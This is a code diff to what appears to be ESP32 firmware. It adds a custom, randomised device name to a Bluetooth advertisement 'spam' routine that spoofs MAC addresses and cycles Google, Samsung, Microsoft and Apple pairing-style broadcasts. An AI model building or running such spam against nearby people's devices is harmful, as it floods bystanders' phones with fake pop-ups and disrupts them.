@@ -417,7 +417,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
   return AdvData;
 }
   //// https://github.com/Spooks4576
-void executeSpam(EBLEPayloadType type) {
+void executeSpam(EBLEPayloadType type, String spamName = "") {
   uint8_t macAddr[6];
   generateRandomMac(macAddr);
   esp_base_mac_addr_set(macAddr);
@@ -427,6 +427,10 @@ void executeSpam(EBLEPayloadType type) {
   pAdvertising = BLEDevice::getAdvertising();
   BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
   BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
+  if (spamName != ""){
+    String bluetoothName = spamName + String(random() % 1000);  // Creating a random name for the device
+    advertisementData.setName(bluetoothName.c_str());  // Set the advertisement data with the Bluetooth name
+  }
   NimBLEUUID uuid((uint32_t)(random() & 0xFFFFFF));
   pAdvertising->addServiceUUID(uuid);
   pAdvertising->setAdvertisementData(advertisementData);
@@ -476,7 +480,14 @@ void aj_adv(int ble_choice){
           }
           break;
         case 5: //custom
-            String test = keyboard("teste1", 10, "teste2");
+            String spamName = keyboard("teste1", 10, "teste2");
+             if(mael == 0) executeSpam(Google, spamName);
+          if(mael == 1) executeSpam(Samsung, spamName);
+          if(mael == 2) executeSpam(Microsoft, spamName);
+          if(mael == 3) {
+            executeSpam(Apple, spamName);
+            mael = 0;
+          }
       }
       count++;
       timer = millis();
